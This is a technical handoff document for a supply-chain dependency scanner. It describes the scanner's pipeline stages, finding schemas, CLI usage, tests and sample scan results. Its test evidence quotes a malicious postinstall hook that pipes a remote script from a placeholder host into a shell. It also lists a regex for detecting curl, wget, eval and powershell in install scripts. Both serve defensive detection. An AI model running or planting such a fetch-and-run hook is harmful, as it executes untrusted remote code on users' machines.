# P1 BuildGuard Dependency Scanner: Developer Handoff Document

This document serves as the technical reference for the completed **P1 Dependency Scanner** module within the ShieldOps/BuildGuard security architecture. It describes the design, architecture, integration entry points, finding schemas, verified CLI commands, and integration guidance for downstream phases (P2: Build Integrity, P3: Compiler Anomaly Detection, P4: Sandbox Verification).

---

## 1. Purpose

The P1 Dependency Scanner analyzes project dependencies before build execution. It detects supply-chain threats and software vulnerabilities, specifically:

- **Known Vulnerabilities (`KNOWN_VULNERABILITY`)**: Known CVEs and GHSAs reported by the Open Source Vulnerability (OSV) database.
- **Malicious Packages (`KNOWN_MALICIOUS_ADVISORY`)**: Malware packages cataloged by the OpenSSF Malicious Packages repository (advisory IDs starting with `MAL-`).
- **Suspicious Supply Chain Indicators (`SUSPICIOUS_INDICATOR`)**:
  - `TYPOSQUAT`: Package names deceptively close to top registry packages (Damerau-Levenshtein distance).
  - `INSTALL_SCRIPT`: Risky shell execution and download commands (`curl`, `wget`, `eval`, `powershell`, URLs) inside lifecycle hooks (`preinstall`, `install`, `postinstall`).
  - `NONREGISTRY_SOURCE`: Dependencies pulled from direct Git repositories or untrusted HTTP/HTTPS URLs.
  - `MISSING_INTEGRITY`: Registry packages lacking cryptographic hash integrity verification (`sha512` / `sha1`).
  - `NEW_OR_THIN_PACKAGE`: Packages younger than 30 days or with only a single published release.
- **Unresolved Dependencies (`UNRESOLVED`)**: Unpinned version ranges, unsupported ecosystems, or network lookup failures.
- **Verified Clean State (`NO_KNOWN_ISSUES`)**: Explicit positive confirmation that all dependencies were resolved and successfully scanned with no detected issues.

---

## 2. Architecture

The pipeline processes a target directory sequentially through seven coordinated stages:

```
[Target Project Directory]
          │
          ├── 1. Manifest Discovery (discover.py)
          │      └── Scans tree, excludes noise (node_modules, .git, .venv, .buildguard)
          │
          ├── 2. SBOM Generation & Lockfile Parsing
          │      ├── Syft CycloneDX Runner (syft_runner.py) -> CycloneDX JSON
          │      └── Lockfile Parsers (lockfiles.py)
          │             ├── npm v2/v3 & v1 (package-lock.json)
          │             └── Python requirements (requirements.txt)
          │
          ├── 3. Package Normalization & De-duplication
          │      └── Merges SBOM & lockfile data; prioritizes exact pinned versions
          │
          ├── 4. Resolution Verification
          │      └── Separates resolved packages from unsupported/unpinned packages
          │
          ├── 5. OSV Vulnerability Lookup (osv_client.py)
          │      ├── Batch queries (up to 500 items/chunk) to /v1/querybatch
          │      ├── Multi-page pagination support (/v1/query)
          │      ├── Disk caching (SHA-1 keys in <cache_dir>/q_*.json and v_*.json)
          │      └── CVSS v3 score / vector fallback severity calculation
          │
          ├── 6. Supply Chain Heuristics & Registry Meta (heuristics.py, registry.py)
          │      ├── Typosquatting checks against top package datasets (data/)
          │      ├── Lifecycle hook script static analysis (text only, never executed)
          │      └── Registry / fixture metadata inspection (package age & release count)
          │
          └── 7. Result Assembly (scanner.py)
                 └── Outputs validated ModuleResult model
```

### Key Subsystems:
1. **Manifest Discovery ([`discover.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/discover.py))**: Recursively searches for package manifests (`package.json`, `package-lock.json`, `requirements.txt`, `yarn.lock`, `pnpm-lock.yaml`, `go.mod`, `go.sum`, `Cargo.lock`, `pom.xml`, `poetry.lock`, `Pipfile.lock`). Skips ignored directories (`node_modules`, `.git`, `.venv`, `venv`, `__pycache__`, `.buildguard`).
2. **SBOM Generation ([`syft_runner.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/syft_runner.py))**: Executes Anchore Syft (`syft scan dir:<path> -o cyclonedx-json=<out>`) and parses CycloneDX components and PURLs (`pkg:<ecosystem>/<name>@<version>`).
3. **Lockfile Parsing ([`lockfiles.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/lockfiles.py))**:
   - `parse_npm_lock`: Supports npm lockfile formats v2/v3 (`packages` map) and v1 (`dependencies` tree). Preserves scoped package names (e.g. `@babel/core`, `@types/node`) and classifies sources (`registry`, `git`, `url`, `local`).
   - `parse_requirements`: Parses pinned (`==`), unpinned, direct URL references (`pkg @ https://...`), and Git references (`pkg @ git+https://...`, `git+...#egg=pkg`).
4. **Vulnerability Client ([`osv_client.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/osv_client.py))**:
   - Batches up to 500 packages per request against the OSV API (`BUILDGUARD_OSV_URL` or `https://api.osv.dev`).
   - Safe disk caching for queries (`q_<sha1>.json`) and advisories (`v_<sha1>.json`).
   - Exponential backoff retry on HTTP 429 and 5xx errors; immediate error exit on 404.
   - Calculates severity using CVSS v3 vector math if `database_specific.severity` is absent.
5. **Registry Metadata ([`registry.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/registry.py))**:
   - Inspects local `package.json` for workspace/local dependencies.
   - Loads offline test fixtures from `registry_fixtures/<package>.json`.
   - In online mode, queries `https://registry.npmjs.org/` for publish timestamps, release counts, and lifecycle scripts.
6. **Heuristics Engine ([`heuristics.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/heuristics.py))**:
   - `typosquat`: Evaluates Damerau-Levenshtein distance against top npm and PyPI package datasets.
   - `install_script_hits`: Scans preinstall, install, and postinstall hooks with regex `curl|wget|eval|base64|powershell|https?://`. All text is strictly inspected as static strings; scripts are never executed.
   - `clean`: Sanitizes untrusted strings to printable characters and caps output at 300 characters to prevent terminal escape injection.

---

## 3. Integration Entry Points

The scanner exposes two Python functions from [`modules/dependency_scanner`](file:///home/miumiu/shieldops/modules/dependency_scanner/__init__.py):

### `run(project_path: str | Path, options: dict | None = None) -> ModuleResult`

The primary entry point returning the complete module execution result.

- **Parameters**:
  - `project_path` (`str` or `Path`): Filesystem path to the project directory to scan.
  - `options` (`dict`, optional):
    - `"offline"` (`bool`, default `False`): When `True`, restricts OSV lookups and metadata retrieval strictly to cached files and local fixtures.
    - `"osv_cache_dir"` (`str`, optional): Path to cache directory. Defaults to `<project_path>/.buildguard/cache/osv`.
    - `"max_registry_lookups"` (`int`, default `100`): Maximum number of remote registry metadata requests allowed per scan.
- **Returns**: `ModuleResult` Pydantic model.
- **Error Handling**:
  - If `project_path` is not a valid directory, returns `status="error"` with code `"INVALID_INPUT"`.
  - Non-fatal tool or network errors (e.g., Syft missing or OSV network failure) return `status="partial"` with errors recorded in `ModuleResult.errors`.
  - Any unexpected internal exception is caught and returns `status="error"` with error code `"PARSE_ERROR"`.

### `scan_dependencies(project_path: str | Path, options: dict | None = None) -> list[Finding]`

Convenience helper that executes `run(project_path, options)` and returns only the list of `Finding` objects (`result.findings`).

---

## 4. Finding Structure and Result Schemas

Models are imported from `backend.schemas` when available, falling back to [`_schemas_stub.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/_schemas_stub.py).

### Schema Definitions

```python
Category = Literal[
    'KNOWN_VULNERABILITY',
    'KNOWN_MALICIOUS_ADVISORY',
    'SUSPICIOUS_INDICATOR',
    'UNRESOLVED',
    'BUILD_MISMATCH',
    'COMPILER_ANOMALY',
    'NO_KNOWN_ISSUES'
]

Severity = Literal['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO', 'UNKNOWN']
Confidence = Literal['CONFIRMED', 'HIGH', 'MEDIUM', 'LOW']

class Evidence(BaseModel):
    type: str                        # e.g., 'osv_advisory', 'rule_hit', 'tool_output'
    rule_id: Optional[str] = None    # e.g., 'TYPOSQUAT', 'INSTALL_SCRIPT', 'NONREGISTRY_SOURCE', etc.
    data: dict                       # Structured payload (advisory details, distance, hooks)
    untrusted_text: list[str] = []   # Sanitized strings extracted from untrusted inputs

class Finding(BaseModel):
    id: str                          # Format: "D-001", "D-002", ...
    module: Literal['dependency', 'build', 'compiler', 'sandbox'] # Always 'dependency'
    category: Category
    severity: Severity
    confidence: Confidence
    subject: dict                    # Target metadata, e.g. {"ecosystem": "npm", "name": "lodash", "version": "4.17.20"}
    title: str                       # Human-readable summary
    evidence: list[Evidence]
    file_hint: Optional[str] = None  # Relative path to manifest file (e.g., "package.json")
    line_hint: Optional[int] = None  # 1-based line number of the dependency declaration

class ModuleResult(BaseModel):
    module: str                      # "dependency"
    status: Literal['ok', 'partial', 'error', 'skipped']
    findings: list[Finding] = []
    errors: list[dict] = []          # Captured errors, e.g. [{"code": "TOOL_MISSING", "message": "..."}]
    tool_versions: dict = {}         # e.g. {"syft": "1.55.0", "osv_query_time": "2026-10-31T15:35:44Z"}
    duration_ms: int = 0
    checks_performed: list[str] = [] # ["manifest_discovery", "syft_sbom", "npm_lockfile_parse", "osv_lookup", "heuristics"]
```

### Finding Classifications

| Category | Typical Severity | Confidence | Trigger Condition |
|---|---|---|---|
| `KNOWN_MALICIOUS_ADVISORY` | `CRITICAL` | `CONFIRMED` | OSV advisory ID starts with `MAL-` |
| `KNOWN_VULNERABILITY` | `CRITICAL` / `HIGH` / `MEDIUM` / `LOW` | `CONFIRMED` | Standard CVE / GHSA OSV advisory match |
| `SUSPICIOUS_INDICATOR` | `HIGH` (3+ rules or 2 rules) / `MEDIUM` / `LOW` | `HIGH` / `MEDIUM` / `LOW` | Hit on heuristic rules (`TYPOSQUAT`, `INSTALL_SCRIPT`, `NONREGISTRY_SOURCE`, `MISSING_INTEGRITY`, `NEW_OR_THIN_PACKAGE`) |
| `UNRESOLVED` | `INFO` | `LOW` | Unsupported ecosystem, unpinned version without lockfile, or OSV lookup network failure |
| `NO_KNOWN_ISSUES` | `INFO` | `LOW` | All required checks (`syft_sbom`, `osv_lookup`) ran, `len(resolved) > 0`, and 0 unresolved/vulnerable/suspicious findings found |

---

## 5. Usage & Verified CLI Commands

The module is invokable via the Python CLI entry point [`modules.dependency_scanner`](file:///home/miumiu/shieldops/modules/dependency_scanner/cli.py).

### Command-Line Arguments
```text
usage: dependency_scanner [-h] [--offline] [--cache-dir CACHE_DIR] [--out OUT] path
```
- `path`: Target project folder to scan (positional, required).
- `--offline`: Use cached OSV responses and local fixtures only (no outbound HTTP requests).
- `--cache-dir`: Override the default OSV cache directory.
- `--out`: Write JSON result to a file instead of `stdout`.

### Verified CLI Commands

1. **Standard Offline Scan**:
   ```bash
   .venv/bin/python -m modules.dependency_scanner test_samples/deps_clean --offline
   ```

2. **Scan with JSON File Output**:
   ```bash
   .venv/bin/python -m modules.dependency_scanner test_samples/deps_vuln_npm --offline --out /tmp/vuln_scan.json
   ```

3. **Scan with Explicit Cache Directory**:
   ```bash
   .venv/bin/python -m modules.dependency_scanner test_samples/deps_suspicious_npm --offline --cache-dir test_samples/deps_suspicious_npm/.buildguard/cache/osv
   ```

4. **Python API Execution**:
   ```python
   from modules.dependency_scanner import run

   result = run("/path/to/project", {"offline": True})
   print(f"Status: {result.status}, Findings: {len(result.findings)}")
   ```

---

## 6. Dependencies and Setup

### Environment Requirements
- **Python**: 3.12+ (runtime verified on 3.12.3)
- **External Binaries**:
  - `syft` (Anchore Syft 1.55.0+): Generates CycloneDX SBOMs. Configurable via environment variable `BUILDGUARD_SYFT_BIN`.

### Python Dependencies
Installed in `.venv`:
- `pydantic` (2.14.2): Data models and JSON validation.
- `httpx` (0.28.1): HTTP client for OSV batch queries and registry metadata.
- `rapidfuzz` (3.14.6): Damerau-Levenshtein distance calculation for typosquatting detection.
- `pytest` (9.2.0): Unit and regression testing.

### Environment Variables
- `BUILDGUARD_SYFT_BIN`: Custom path to Syft binary (defaults to `"syft"`).
- `BUILDGUARD_OSV_URL`: Custom base URL for OSV API (defaults to `"https://api.osv.dev"`).
- `BUILDGUARD_DATA_DIR` / `SHIELDOPS_DATA_DIR`: Custom path to top packages dataset folder (defaults to search paths up to repo root `data/`).

---

## 7. Testing & Verification

### Running the Test Suite
```bash
.venv/bin/pytest -v
```

### Verified Test Suite Breakdown (61 Tests Passing)
- **Lockfile Parsing ([`test_lockfiles.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_lockfiles.py))**:
  - npm v2/v3 sources (`registry`, `git`, `url`, `local`, `unknown`).
  - Scoped npm package names without metadata (`@babel/core`, `@types/node`, `@scope/nested`).
  - npm lockfile v1 nested dependencies.
  - Python `requirements.txt` pinned, unpinned, direct URLs, and Git references.
- **PURL Parsing ([`test_purl.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_purl.py))**:
  - Scoped and unscoped npm PURLs (with and without versions).
  - PyPI, Maven (colon namespace normalization), Go, and malformed inputs.
- **OSV Client ([`test_osv_client.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_osv_client.py), [`test_osv_client_batch.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_osv_client_batch.py))**:
  - Batch queries, caching, single advisory retrieval.
  - `None` version safety in cache keys (`package = ("npm", "lodash", None)`).
  - HTTP 404 instant exit without retries.
  - HTTP 500 recovery and HTTP 429 backoff exhaustion.
  - Multi-page pagination (`_paginate`).
  - CVSS v3 score / vector severity calculation.
- **Heuristics ([`test_heuristics.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_heuristics.py))**:
  - Typosquat distance, dangerous script patterns, clean string sanitization.
- **Discovery ([`test_discovery.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_discovery.py))**:
  - Manifest detection and `node_modules` skipping. Line number resolution.
- **Syft Runner ([`test_syft_runner.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_syft_runner.py))**:
  - `TOOL_MISSING`, `TIMEOUT`, `PARSE_ERROR` handling, and CycloneDX JSON parsing.
- **Registry Metadata ([`test_registry.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_registry.py))**:
  - Local package scripts, offline fixtures, mock HTTP handling, and package age calculations.
- **CLI ([`test_cli.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_cli.py))**:
  - Default runs, `--out` file writing, and exit codes.
- **Scanner Integration & Sample Regressions ([`test_scanner.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/tests/test_scanner.py))**:
  - Invalid directories, empty projects (asserts no false `NO_KNOWN_ISSUES`), unpinned dependencies.
  - Automated regressions against all three sample projects (`deps_clean`, `deps_suspicious_npm`, `deps_vuln_npm`).

---

## 8. Sample Projects & Evidence Baselines

Three sample demonstration projects in `test_samples/` validate the scanner against recorded outputs in `docs/evidence/`:

### 1. `test_samples/deps_clean` -> [`docs/evidence/clean_scan.json`](file:///home/miumiu/shieldops/docs/evidence/clean_scan.json)
- **Project Type**: Local npm package using workspace `vendor/clean-helper`.
- **Scan Status**: `ok`
- **Findings**: 1 finding:
  - `id`: `"D-001"`
  - `category`: `"NO_KNOWN_ISSUES"`
  - `severity`: `"INFO"`
  - `confidence`: `"LOW"`
  - `subject`: `{"packages_checked": 1}`
  - `title`: `"No known issues detected by the checks performed"`

### 2. `test_samples/deps_suspicious_npm` -> [`docs/evidence/suspicious_scan.json`](file:///home/miumiu/shieldops/docs/evidence/suspicious_scan.json)
- **Project Type**: npm package with local vendor directory and registry fixture for `lodahs 1.0.0`.
- **Scan Status**: `ok`
- **Findings**: 1 finding:
  - `id`: `"D-001"`
  - `category`: `"SUSPICIOUS_INDICATOR"`
  - `severity`: `"HIGH"`
  - `confidence`: `"HIGH"`
  - `subject`: `{"ecosystem": "npm", "name": "lodahs", "version": "1.0.0"}`
  - `title`: `"lodahs: 3 suspicious indicator(s) (INSTALL_SCRIPT, NEW_OR_THIN_PACKAGE, TYPOSQUAT)"`
  - `evidence`:
    - `TYPOSQUAT`: Similar to `"lodash"`, distance 1.
    - `INSTALL_SCRIPT`: Hook `"postinstall"` containing `"curl http://example.invalid/run.sh | sh"`.
    - `NEW_OR_THIN_PACKAGE`: `age_days: 2`, `version_count: 1`.

### 3. `test_samples/deps_vuln_npm` -> [`docs/evidence/vulnerable_scan.json`](file:///home/miumiu/shieldops/docs/evidence/vulnerable_scan.json)
- **Project Type**: Standard npm project with `lodash 4.17.20` backed by pre-cached OSV query and advisory records.
- **Scan Status**: `ok`
- **Findings**: 1 finding:
  - `id`: `"D-001"`
  - `category`: `"KNOWN_VULNERABILITY"`
  - `severity`: `"HIGH"`
  - `confidence`: `"CONFIRMED"`
  - `subject`: `{"ecosystem": "npm", "name": "lodash", "version": "4.17.20"}`
  - `title`: `"lodash 4.17.20: 5 OSV advisory record(s)"`
  - `evidence`: 5 OSV advisory records (`GHSA-29mw-wpgm-hmr9`, `GHSA-35jh-r3h4-6jhm`, `GHSA-f23m-r3pf-42rh`, `GHSA-r5fr-rjxr-66jc`, `GHSA-xxjr-mmjv-4gpg`).

---

## 9. Known Limitations

1. **Unresolved Complex Python Version Specifiers**:
   Requirements with compound comparative ranges (e.g. `package >= 1.0, < 2.0`) without exact pins (`==`) are treated as unpinned (`version = None`) by `parse_requirements`. If Syft is unavailable, they generate `UNRESOLVED: no exact version` findings.
2. **Lockfile v1 Integrity Hashes**:
   Some legacy npm v1 lockfiles generated by npm 5/6 omit cryptographic `integrity` hashes for git or direct URL dependencies.
3. **Transitive Line Numbers**:
   Transitive dependencies not explicitly mentioned in top-level manifest files (`package.json`, `requirements.txt`, `go.mod`) resolve `file_hint` to the base manifest path with `line_hint = None`.
4. **Offline Heuristic Age Queries**:
   When scanning in `--offline` mode, package age and release count checks (`NEW_OR_THIN_PACKAGE`) only trigger if offline fixtures exist in `registry_fixtures/<package>.json`. They do not make live network requests.

---

## 10. Integration Notes for P2, P3, and P4 Modules

### Shared Schema Consumption
- All modules (P1 Dependency, P2 Build, P3 Compiler, P4 Sandbox) share the unified `ModuleResult` and `Finding` schema defined in `backend.schemas` (with fallback to [`_schemas_stub.py`](file:///home/miumiu/shieldops/modules/dependency_scanner/_schemas_stub.py)).
- **Result Aggregation**:
  Downstream orchestrators can check `result.status`:
  - `status == "ok"`: Scanning succeeded; evaluate `result.findings`.
  - `status == "partial"`: Tool or network error occurred; inspect `result.errors` for diagnostic codes (`TOOL_MISSING`, `NETWORK_ERROR`, `DATA_MISSING`).
  - `status == "error"`: Fatal execution failure (`INVALID_INPUT`, `PARSE_ERROR`).

### Downstream Handoff Opportunities
- **P2 (Build Integrity)**:
  - Can cross-reference `Pkg.integrity` hashes parsed from `package-lock.json` against artifacts fetched during build execution.
  - Can check if packages identified as `NONREGISTRY_SOURCE` by P1 attempt unexpected network downloads during the build phase.
- **P3 (Compiler Anomaly Detection)**:
  - Can use `result.findings` to establish whether high-severity vulnerabilities or malicious packages were already present in source dependencies before flagging downstream compilation anomalies.
- **P4 (Sandbox Verification)**:
  - Can ingest findings with `rule_id == "INSTALL_SCRIPT"` (and the associated `untrusted_text` payload) to instrument targeted sandbox monitoring rules for child processes spawned during `npm install` or `pip install`.
